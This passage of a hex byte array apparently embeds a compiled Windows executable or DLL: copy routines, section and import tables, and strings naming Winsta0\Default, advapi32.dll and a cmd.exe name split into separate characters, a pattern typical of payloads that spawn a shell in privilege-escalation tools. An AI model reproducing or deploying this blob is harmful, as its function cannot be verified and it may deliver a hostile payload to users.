	0x49, 0x2B, 0xC9, 0x49, 0x2B, 0xD1, 0x4D, 0x03, 0xC1, 0x49, 0x81, 0xF8, 0x00, 0x01, 0x00, 0x00,
	0x0F, 0x86, 0xA2, 0x00, 0x00, 0x00, 0x49, 0x81, 0xF8, 0x00, 0x00, 0x18, 0x00, 0x0F, 0x87, 0x3D,
	0x01, 0x00, 0x00, 0x66, 0x66, 0x66, 0x66, 0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xC5, 0xFE, 0x6F, 0x0A, 0xC5, 0xFE, 0x6F, 0x52, 0x20, 0xC5, 0xFE, 0x6F, 0x5A, 0x40, 0xC5, 0xFE,
	0x6F, 0x62, 0x60, 0xC5, 0xFD, 0x7F, 0x09, 0xC5, 0xFD, 0x7F, 0x51, 0x20, 0xC5, 0xFD, 0x7F, 0x59,
	0x40, 0xC5, 0xFD, 0x7F, 0x61, 0x60, 0xC5, 0xFE, 0x6F, 0x8A, 0x80, 0x00, 0x00, 0x00, 0xC5, 0xFE,
	0x6F, 0x92, 0xA0, 0x00, 0x00, 0x00, 0xC5, 0xFE, 0x6F, 0x9A, 0xC0, 0x00, 0x00, 0x00, 0xC5, 0xFE,
	0x6F, 0xA2, 0xE0, 0x00, 0x00, 0x00, 0xC5, 0xFD, 0x7F, 0x89, 0x80, 0x00, 0x00, 0x00, 0xC5, 0xFD,
	0x7F, 0x91, 0xA0, 0x00, 0x00, 0x00, 0xC5, 0xFD, 0x7F, 0x99, 0xC0, 0x00, 0x00, 0x00, 0xC5, 0xFD,
	0x7F, 0xA1, 0xE0, 0x00, 0x00, 0x00, 0x48, 0x81, 0xC1, 0x00, 0x01, 0x00, 0x00, 0x48, 0x81, 0xC2,
	0x00, 0x01, 0x00, 0x00, 0x49, 0x81, 0xE8, 0x00, 0x01, 0x00, 0x00, 0x49, 0x81, 0xF8, 0x00, 0x01,
	0x00, 0x00, 0x0F, 0x83, 0x78, 0xFF, 0xFF, 0xFF, 0x4D, 0x8D, 0x48, 0x1F, 0x49, 0x83, 0xE1, 0xE0,
	0x4D, 0x8B, 0xD9, 0x49, 0xC1, 0xEB, 0x05, 0x47, 0x8B, 0x9C, 0x9A, 0x50, 0x32, 0x00, 0x00, 0x4D,
	0x03, 0xDA, 0x41, 0xFF, 0xE3, 0xC4, 0xA1, 0x7E, 0x6F, 0x8C, 0x0A, 0x00, 0xFF, 0xFF, 0xFF, 0xC4,
	0xA1, 0x7E, 0x7F, 0x8C, 0x09, 0x00, 0xFF, 0xFF, 0xFF, 0xC4, 0xA1, 0x7E, 0x6F, 0x8C, 0x0A, 0x20,
	0xFF, 0xFF, 0xFF, 0xC4, 0xA1, 0x7E, 0x7F, 0x8C, 0x09, 0x20, 0xFF, 0xFF, 0xFF, 0xC4, 0xA1, 0x7E,
	0x6F, 0x8C, 0x0A, 0x40, 0xFF, 0xFF, 0xFF, 0xC4, 0xA1, 0x7E, 0x7F, 0x8C, 0x09, 0x40, 0xFF, 0xFF,
	0xFF, 0xC4, 0xA1, 0x7E, 0x6F, 0x8C, 0x0A, 0x60, 0xFF, 0xFF, 0xFF, 0xC4, 0xA1, 0x7E, 0x7F, 0x8C,
	0x09, 0x60, 0xFF, 0xFF, 0xFF, 0xC4, 0xA1, 0x7E, 0x6F, 0x4C, 0x0A, 0x80, 0xC4, 0xA1, 0x7E, 0x7F,
	0x4C, 0x09, 0x80, 0xC4, 0xA1, 0x7E, 0x6F, 0x4C, 0x0A, 0xA0, 0xC4, 0xA1, 0x7E, 0x7F, 0x4C, 0x09,
	0xA0, 0xC4, 0xA1, 0x7E, 0x6F, 0x4C, 0x0A, 0xC0, 0xC4, 0xA1, 0x7E, 0x7F, 0x4C, 0x09, 0xC0, 0xC4,
	0xA1, 0x7E, 0x7F, 0x6C, 0x01, 0xE0, 0xC5, 0xFE, 0x7F, 0x00, 0xC5, 0xF8, 0x77, 0xC3, 0x66, 0x90,
	0xC5, 0xFE, 0x6F, 0x0A, 0xC5, 0xFE, 0x6F, 0x52, 0x20, 0xC5, 0xFE, 0x6F, 0x5A, 0x40, 0xC5, 0xFE,
	0x6F, 0x62, 0x60, 0xC5, 0xFD, 0xE7, 0x09, 0xC5, 0xFD, 0xE7, 0x51, 0x20, 0xC5, 0xFD, 0xE7, 0x59,
	0x40, 0xC5, 0xFD, 0xE7, 0x61, 0x60, 0xC5, 0xFE, 0x6F, 0x8A, 0x80, 0x00, 0x00, 0x00, 0xC5, 0xFE,
	0x6F, 0x92, 0xA0, 0x00, 0x00, 0x00, 0xC5, 0xFE, 0x6F, 0x9A, 0xC0, 0x00, 0x00, 0x00, 0xC5, 0xFE,
	0x6F, 0xA2, 0xE0, 0x00, 0x00, 0x00, 0xC5, 0xFD, 0xE7, 0x89, 0x80, 0x00, 0x00, 0x00, 0xC5, 0xFD,
	0xE7, 0x91, 0xA0, 0x00, 0x00, 0x00, 0xC5, 0xFD, 0xE7, 0x99, 0xC0, 0x00, 0x00, 0x00, 0xC5, 0xFD,
	0xE7, 0xA1, 0xE0, 0x00, 0x00, 0x00, 0x48, 0x81, 0xC1, 0x00, 0x01, 0x00, 0x00, 0x48, 0x81, 0xC2,
	0x00, 0x01, 0x00, 0x00, 0x49, 0x81, 0xE8, 0x00, 0x01, 0x00, 0x00, 0x49, 0x81, 0xF8, 0x00, 0x01,
	0x00, 0x00, 0x0F, 0x83, 0x78, 0xFF, 0xFF, 0xFF, 0x4D, 0x8D, 0x48, 0x1F, 0x49, 0x83, 0xE1, 0xE0,
	0x4D, 0x8B, 0xD9, 0x49, 0xC1, 0xEB, 0x05, 0x47, 0x8B, 0x9C, 0x9A, 0x74, 0x32, 0x00, 0x00, 0x4D,
	0x03, 0xDA, 0x41, 0xFF, 0xE3, 0xC4, 0xA1, 0x7E, 0x6F, 0x8C, 0x0A, 0x00, 0xFF, 0xFF, 0xFF, 0xC4,
	0xA1, 0x7D, 0xE7, 0x8C, 0x09, 0x00, 0xFF, 0xFF, 0xFF, 0xC4, 0xA1, 0x7E, 0x6F, 0x8C, 0x0A, 0x20,
	0xFF, 0xFF, 0xFF, 0xC4, 0xA1, 0x7D, 0xE7, 0x8C, 0x09, 0x20, 0xFF, 0xFF, 0xFF, 0xC4, 0xA1, 0x7E,
	0x6F, 0x8C, 0x0A, 0x40, 0xFF, 0xFF, 0xFF, 0xC4, 0xA1, 0x7D, 0xE7, 0x8C, 0x09, 0x40, 0xFF, 0xFF,
	0xFF, 0xC4, 0xA1, 0x7E, 0x6F, 0x8C, 0x0A, 0x60, 0xFF, 0xFF, 0xFF, 0xC4, 0xA1, 0x7D, 0xE7, 0x8C,
	0x09, 0x60, 0xFF, 0xFF, 0xFF, 0xC4, 0xA1, 0x7E, 0x6F, 0x4C, 0x0A, 0x80, 0xC4, 0xA1, 0x7D, 0xE7,
	0x4C, 0x09, 0x80, 0xC4, 0xA1, 0x7E, 0x6F, 0x4C, 0x0A, 0xA0, 0xC4, 0xA1, 0x7D, 0xE7, 0x4C, 0x09,
	0xA0, 0xC4, 0xA1, 0x7E, 0x6F, 0x4C, 0x0A, 0xC0, 0xC4, 0xA1, 0x7D, 0xE7, 0x4C, 0x09, 0xC0, 0xC4,
	0xA1, 0x7E, 0x7F, 0x6C, 0x01, 0xE0, 0xC5, 0xFE, 0x7F, 0x00, 0x0F, 0xAE, 0xF8, 0xC5, 0xF8, 0x77,
	0xC3, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x49, 0x81, 0xF8, 0x00, 0x08, 0x00, 0x00, 0x76, 0x0D, 0xF6, 0x05, 0x0C, 0x1B, 0x00, 0x00, 0x02,
	0x0F, 0x85, 0x9A, 0xFB, 0xFF, 0xFF, 0xF3, 0x0F, 0x6F, 0x02, 0xF3, 0x42, 0x0F, 0x6F, 0x6C, 0x02,
	0xF0, 0x49, 0x81, 0xF8, 0x80, 0x00, 0x00, 0x00, 0x0F, 0x86, 0x8E, 0x00, 0x00, 0x00, 0x4C, 0x8B,
	0xC9, 0x49, 0x83, 0xE1, 0x0F, 0x49, 0x83, 0xE9, 0x10, 0x49, 0x2B, 0xC9, 0x49, 0x2B, 0xD1, 0x4D,
	0x03, 0xC1, 0x49, 0x81, 0xF8, 0x80, 0x00, 0x00, 0x00, 0x76, 0x71, 0x0F, 0x1F, 0x44, 0x00, 0x00,
	0xF3, 0x0F, 0x6F, 0x0A, 0xF3, 0x0F, 0x6F, 0x52, 0x10, 0xF3, 0x0F, 0x6F, 0x5A, 0x20, 0xF3, 0x0F,
	0x6F, 0x62, 0x30, 0x66, 0x0F, 0x7F, 0x09, 0x66, 0x0F, 0x7F, 0x51, 0x10, 0x66, 0x0F, 0x7F, 0x59,
	0x20, 0x66, 0x0F, 0x7F, 0x61, 0x30, 0xF3, 0x0F, 0x6F, 0x4A, 0x40, 0xF3, 0x0F, 0x6F, 0x52, 0x50,
	0xF3, 0x0F, 0x6F, 0x5A, 0x60, 0xF3, 0x0F, 0x6F, 0x62, 0x70, 0x66, 0x0F, 0x7F, 0x49, 0x40, 0x66,
	0x0F, 0x7F, 0x51, 0x50, 0x66, 0x0F, 0x7F, 0x59, 0x60, 0x66, 0x0F, 0x7F, 0x61, 0x70, 0x48, 0x81,
	0xC1, 0x80, 0x00, 0x00, 0x00, 0x48, 0x81, 0xC2, 0x80, 0x00, 0x00, 0x00, 0x49, 0x81, 0xE8, 0x80,
	0x00, 0x00, 0x00, 0x49, 0x81, 0xF8, 0x80, 0x00, 0x00, 0x00, 0x73, 0x94, 0x4D, 0x8D, 0x48, 0x0F,
	0x49, 0x83, 0xE1, 0xF0, 0x4D, 0x8B, 0xD9, 0x49, 0xC1, 0xEB, 0x04, 0x47, 0x8B, 0x9C, 0x9A, 0x98,
	0x32, 0x00, 0x00, 0x4D, 0x03, 0xDA, 0x41, 0xFF, 0xE3, 0xF3, 0x42, 0x0F, 0x6F, 0x4C, 0x0A, 0x80,
	0xF3, 0x42, 0x0F, 0x7F, 0x4C, 0x09, 0x80, 0xF3, 0x42, 0x0F, 0x6F, 0x4C, 0x0A, 0x90, 0xF3, 0x42,
	0x0F, 0x7F, 0x4C, 0x09, 0x90, 0xF3, 0x42, 0x0F, 0x6F, 0x4C, 0x0A, 0xA0, 0xF3, 0x42, 0x0F, 0x7F,
	0x4C, 0x09, 0xA0, 0xF3, 0x42, 0x0F, 0x6F, 0x4C, 0x0A, 0xB0, 0xF3, 0x42, 0x0F, 0x7F, 0x4C, 0x09,
	0xB0, 0xF3, 0x42, 0x0F, 0x6F, 0x4C, 0x0A, 0xC0, 0xF3, 0x42, 0x0F, 0x7F, 0x4C, 0x09, 0xC0, 0xF3,
	0x42, 0x0F, 0x6F, 0x4C, 0x0A, 0xD0, 0xF3, 0x42, 0x0F, 0x7F, 0x4C, 0x09, 0xD0, 0xF3, 0x42, 0x0F,
	0x6F, 0x4C, 0x0A, 0xE0, 0xF3, 0x42, 0x0F, 0x7F, 0x4C, 0x09, 0xE0, 0xF3, 0x42, 0x0F, 0x7F, 0x6C,
	0x01, 0xF0, 0xF3, 0x0F, 0x7F, 0x00, 0xC3, 0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x0F, 0x10, 0x12, 0x48, 0x2B, 0xD1, 0x49, 0x03, 0xC8, 0x0F, 0x10, 0x44, 0x11, 0xF0, 0x48, 0x83,
	0xE9, 0x10, 0x49, 0x83, 0xE8, 0x10, 0xF6, 0xC1, 0x0F, 0x74, 0x18, 0x4C, 0x8B, 0xC9, 0x48, 0x83,
	0xE1, 0xF0, 0x0F, 0x10, 0xC8, 0x0F, 0x10, 0x04, 0x11, 0x41, 0x0F, 0x11, 0x09, 0x4C, 0x8B, 0xC1,
	0x4C, 0x2B, 0xC0, 0x4D, 0x8B, 0xC8, 0x49, 0xC1, 0xE9, 0x07, 0x74, 0x71, 0x0F, 0x29, 0x01, 0xEB,
	0x16, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x0F, 0x29, 0x41, 0x10, 0x0F, 0x29, 0x09, 0x0F, 0x10, 0x44, 0x11, 0xF0, 0x0F, 0x10, 0x4C, 0x11,
	0xE0, 0x48, 0x81, 0xE9, 0x80, 0x00, 0x00, 0x00, 0x0F, 0x29, 0x41, 0x70, 0x0F, 0x29, 0x49, 0x60,
	0x0F, 0x10, 0x44, 0x11, 0x50, 0x0F, 0x10, 0x4C, 0x11, 0x40, 0x49, 0xFF, 0xC9, 0x0F, 0x29, 0x41,
	0x50, 0x0F, 0x29, 0x49, 0x40, 0x0F, 0x10, 0x44, 0x11, 0x30, 0x0F, 0x10, 0x4C, 0x11, 0x20, 0x0F,
	0x29, 0x41, 0x30, 0x0F, 0x29, 0x49, 0x20, 0x0F, 0x10, 0x44, 0x11, 0x10, 0x0F, 0x10, 0x0C, 0x11,
	0x75, 0xAE, 0x0F, 0x29, 0x41, 0x10, 0x49, 0x83, 0xE0, 0x7F, 0x0F, 0x28, 0xC1, 0x4D, 0x8B, 0xC8,
	0x49, 0xC1, 0xE9, 0x04, 0x74, 0x1A, 0x66, 0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x0F, 0x11, 0x01, 0x48, 0x83, 0xE9, 0x10, 0x0F, 0x10, 0x04, 0x11, 0x49, 0xFF, 0xC9, 0x75, 0xF0,
	0x49, 0x83, 0xE0, 0x0F, 0x74, 0x03, 0x0F, 0x11, 0x10, 0x0F, 0x11, 0x01, 0xC3, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xF0, 0x37, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0C, 0x38, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x1A, 0x38, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x3C, 0x38, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x5C, 0x38, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x72, 0x38, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x86, 0x38, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x98, 0x38, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xAC, 0x38, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xC2, 0x38, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xE0, 0x38, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xEE, 0x38, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0C, 0x39, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x24, 0x39, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3C, 0x39, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x5A, 0x39, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x74, 0x39, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x88, 0x39, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xA0, 0x39, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xAA, 0x39, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xB8, 0x39, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xCA, 0x39, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xD8, 0x39, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xEA, 0x39, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xF8, 0x39, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x0C, 0x3A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x1A, 0x3A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x32, 0x3A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4A, 0x3A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x64, 0x3A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x84, 0x3A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x94, 0x3A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xAC, 0x3A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xC2, 0x3A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xD0, 0x3A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xE4, 0x3A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x5C, 0x00, 0x42, 0x00, 0x61, 0x00, 0x73, 0x00, 0x65, 0x00, 0x4E, 0x00, 0x61, 0x00, 0x6D, 0x00,
	0x65, 0x00, 0x64, 0x00, 0x4F, 0x00, 0x62, 0x00, 0x6A, 0x00, 0x65, 0x00, 0x63, 0x00, 0x74, 0x00,
	0x73, 0x00, 0x5C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x63, 0x00, 0x00, 0x00, 0x6D, 0x00, 0x00, 0x00,
	0x64, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2E, 0x00, 0x65, 0x00, 0x78, 0x00, 0x65, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x57, 0x00, 0x69, 0x00, 0x6E, 0x00, 0x73, 0x00,
	0x74, 0x00, 0x61, 0x00, 0x30, 0x00, 0x5C, 0x00, 0x44, 0x00, 0x65, 0x00, 0x66, 0x00, 0x61, 0x00,
	0x75, 0x00, 0x6C, 0x00, 0x74, 0x00, 0x00, 0x00, 0x6B, 0x00, 0x65, 0x00, 0x72, 0x00, 0x6E, 0x00,
	0x65, 0x00, 0x6C, 0x00, 0x33, 0x00, 0x32, 0x00, 0x2E, 0x00, 0x64, 0x00, 0x6C, 0x00, 0x6C, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x61, 0x00, 0x64, 0x00, 0x76, 0x00, 0x61, 0x00,
	0x70, 0x00, 0x69, 0x00, 0x33, 0x00, 0x32, 0x00, 0x2E, 0x00, 0x64, 0x00, 0x6C, 0x00, 0x6C, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x67, 0xF0, 0xD4, 0x68, 0x00, 0x00, 0x00, 0x00,
	0x0D, 0x00, 0x00, 0x00, 0x34, 0x01, 0x00, 0x00, 0xD4, 0x32, 0x00, 0x00, 0xD4, 0x1E, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x67, 0xF0, 0xD4, 0x68, 0x00, 0x00, 0x00, 0x00, 0x0E, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0xFE, 0x20, 0x00, 0x00, 0xE4, 0x21, 0x00, 0x00, 0x38, 0x21, 0x00, 0x00, 0x6F, 0x21, 0x00, 0x00,
	0xEA, 0x21, 0x00, 0x00, 0xCF, 0x21, 0x00, 0x00, 0xC0, 0x21, 0x00, 0x00, 0x40, 0x21, 0x00, 0x00,
	0xDD, 0x21, 0x00, 0x00, 0xA5, 0x21, 0x00, 0x00, 0x96, 0x21, 0x00, 0x00, 0x20, 0x21, 0x00, 0x00,
	0xB3, 0x21, 0x00, 0x00, 0x80, 0x21, 0x00, 0x00, 0x58, 0x21, 0x00, 0x00, 0x00, 0x21, 0x00, 0x00,
	0xC6, 0x23, 0x00, 0x00, 0xBF, 0x23, 0x00, 0x00, 0xB1, 0x23, 0x00, 0x00, 0xA3, 0x23, 0x00, 0x00,
	0x95, 0x23, 0x00, 0x00, 0x81, 0x23, 0x00, 0x00, 0x6D, 0x23, 0x00, 0x00, 0x59, 0x23, 0x00, 0x00,
	0x45, 0x23, 0x00, 0x00, 0xF6, 0x24, 0x00, 0x00, 0xEF, 0x24, 0x00, 0x00, 0xE1, 0x24, 0x00, 0x00,
	0xD3, 0x24, 0x00, 0x00, 0xC5, 0x24, 0x00, 0x00, 0xB1, 0x24, 0x00, 0x00, 0x9D, 0x24, 0x00, 0x00,
	0x89, 0x24, 0x00, 0x00, 0x75, 0x24, 0x00, 0x00, 0x52, 0x26, 0x00, 0x00, 0x4B, 0x26, 0x00, 0x00,
	0x3D, 0x26, 0x00, 0x00, 0x2F, 0x26, 0x00, 0x00, 0x21, 0x26, 0x00, 0x00, 0x13, 0x26, 0x00, 0x00,
	0x05, 0x26, 0x00, 0x00, 0xF7, 0x25, 0x00, 0x00, 0xE9, 0x25, 0x00, 0x00, 0x18, 0x00, 0x00, 0x00,
	0x03, 0x80, 0x03, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x47, 0x43, 0x54, 0x4C, 0x00, 0x10, 0x00, 0x00, 0xA0, 0x10, 0x00, 0x00,
	0x2E, 0x74, 0x65, 0x78, 0x74, 0x24, 0x6D, 0x6E, 0x00, 0x00, 0x00, 0x00, 0xA0, 0x20, 0x00, 0x00,
	0x9D, 0x06, 0x00, 0x00, 0x2E, 0x74, 0x65, 0x78, 0x74, 0x24, 0x6D, 0x6E, 0x24, 0x32, 0x31, 0x00,
	0x00, 0x30, 0x00, 0x00, 0x30, 0x01, 0x00, 0x00, 0x2E, 0x69, 0x64, 0x61, 0x74, 0x61, 0x24, 0x35,
	0x00, 0x00, 0x00, 0x00, 0x30, 0x31, 0x00, 0x00, 0xE0, 0x00, 0x00, 0x00, 0x2E, 0x72, 0x64, 0x61,
	0x74, 0x61, 0x00, 0x00, 0x10, 0x32, 0x00, 0x00, 0xAC, 0x00, 0x00, 0x00, 0x2E, 0x72, 0x64, 0x61,
	0x74, 0x61, 0x24, 0x30, 0x30, 0x00, 0x00, 0x00, 0xBC, 0x32, 0x00, 0x00, 0x18, 0x00, 0x00, 0x00,
	0x2E, 0x72, 0x64, 0x61, 0x74, 0x61, 0x24, 0x76, 0x6F, 0x6C, 0x74, 0x6D, 0x64, 0x00, 0x00, 0x00,
	0xD4, 0x32, 0x00, 0x00, 0x5C, 0x01, 0x00, 0x00, 0x2E, 0x72, 0x64, 0x61, 0x74, 0x61, 0x24, 0x7A,
	0x7A, 0x7A, 0x64, 0x62, 0x67, 0x00, 0x00, 0x00, 0x30, 0x34, 0x00, 0x00, 0xA0, 0x01, 0x00, 0x00,
	0x2E, 0x78, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0xD0, 0x35, 0x00, 0x00, 0xB0, 0x00, 0x00, 0x00,
	0x2E, 0x65, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0x80, 0x36, 0x00, 0x00, 0x28, 0x00, 0x00, 0x00,
	0x2E, 0x69, 0x64, 0x61, 0x74, 0x61, 0x24, 0x32, 0x00, 0x00, 0x00, 0x00, 0xA8, 0x36, 0x00, 0x00,
	0x18, 0x00, 0x00, 0x00, 0x2E, 0x69, 0x64, 0x61, 0x74, 0x61, 0x24, 0x33, 0x00, 0x00, 0x00, 0x00,
	0xC0, 0x36, 0x00, 0x00, 0x30, 0x01, 0x00, 0x00, 0x2E, 0x69, 0x64, 0x61, 0x74, 0x61, 0x24, 0x34,
	0x00, 0x00, 0x00, 0x00, 0xF0, 0x37, 0x00, 0x00, 0x12, 0x03, 0x00, 0x00, 0x2E, 0x69, 0x64, 0x61,
	0x74, 0x61, 0x24, 0x36, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00,
	0x2E, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0x00, 0x20, 0x40, 0x00, 0x00, 0x54, 0x08, 0x00, 0x00,
	0x2E, 0x62, 0x73, 0x73, 0x00, 0x00, 0x00, 0x00, 0x00, 0x50, 0x00, 0x00, 0x44, 0x01, 0x00, 0x00,
	0x2E, 0x70, 0x64, 0x61, 0x74, 0x61, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x01, 0x04, 0x01, 0x00, 0x04, 0x82, 0x00, 0x00, 0x01, 0x12, 0x05, 0x00, 0x12, 0x74, 0x31, 0x00,
	0x12, 0x01, 0x2C, 0x00, 0x06, 0x50, 0x00, 0x00, 0x01, 0x15, 0x06, 0x00, 0x15, 0x01, 0x3B, 0x01,
	0x06, 0xE0, 0x04, 0x60, 0x03, 0x30, 0x02, 0x50, 0x21, 0x08, 0x02, 0x00, 0x08, 0x74, 0x3A, 0x01,
	0xD0, 0x12, 0x00, 0x00, 0x14, 0x13, 0x00, 0x00, 0x48, 0x34, 0x00, 0x00, 0x21, 0x00, 0x00, 0x00,
	0xD0, 0x12, 0x00, 0x00, 0x14, 0x13, 0x00, 0x00, 0x48, 0x34, 0x00, 0x00, 0x01, 0x0A, 0x04, 0x00,
	0x0A, 0x34, 0x0E, 0x00, 0x0A, 0xB2, 0x06, 0x70, 0x01, 0x04, 0x01, 0x00, 0x04, 0x42, 0x00, 0x00,
	0x01, 0x23, 0x08, 0x00, 0x23, 0x01, 0xF3, 0x00, 0x14, 0xF0, 0x12, 0xE0, 0x10, 0xD0, 0x0E, 0xC0,
	0x0C, 0x30, 0x0B, 0x50, 0x21, 0x08, 0x02, 0x00, 0x08, 0x64, 0xFD, 0x00, 0x60, 0x15, 0x00, 0x00,
	0xC3, 0x16, 0x00, 0x00, 0x90, 0x34, 0x00, 0x00, 0x21, 0x08, 0x02, 0x00, 0x08, 0x74, 0xF2, 0x00,
	0xC3, 0x16, 0x00, 0x00, 0xCB, 0x16, 0x00, 0x00, 0xA4, 0x34, 0x00, 0x00, 0x21, 0x00, 0x00, 0x00,
	0xC3, 0x16, 0x00, 0x00, 0xCB, 0x16, 0x00, 0x00, 0xA4, 0x34, 0x00, 0x00, 0x21, 0x00, 0x00, 0x00,
	0x60, 0x15, 0x00, 0x00, 0xC3, 0x16, 0x00, 0x00, 0x90, 0x34, 0x00, 0x00, 0x01, 0x0B, 0x04, 0x00,
	0x0B, 0xD2, 0x07, 0xE0, 0x05, 0x70, 0x04, 0x30, 0x21, 0x05, 0x02, 0x00, 0x05, 0x64, 0x0D, 0x00,
	0x40, 0x1B, 0x00, 0x00, 0xCD, 0x1B, 0x00, 0x00, 0xEC, 0x34, 0x00, 0x00, 0x21, 0x00, 0x00, 0x00,
	0x40, 0x1B, 0x00, 0x00, 0xCD, 0x1B, 0x00, 0x00, 0xEC, 0x34, 0x00, 0x00, 0x01, 0x08, 0x02, 0x00,
	0x08, 0xB2, 0x04, 0x30, 0x21, 0x44, 0x04, 0x00, 0x44, 0x64, 0x0B, 0x00, 0x05, 0x74, 0x0A, 0x00,
	0x10, 0x1D, 0x00, 0x00, 0x9D, 0x1D, 0x00, 0x00, 0x1C, 0x35, 0x00, 0x00, 0x21, 0x00, 0x04, 0x00,
	0x00, 0x74, 0x0A, 0x00, 0x00, 0x64, 0x0B, 0x00, 0x10, 0x1D, 0x00, 0x00, 0x9D, 0x1D, 0x00, 0x00,
